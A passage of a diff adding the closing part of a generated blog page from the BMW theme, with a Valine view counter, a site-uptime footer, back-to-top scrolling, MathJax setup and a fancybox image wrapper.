+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
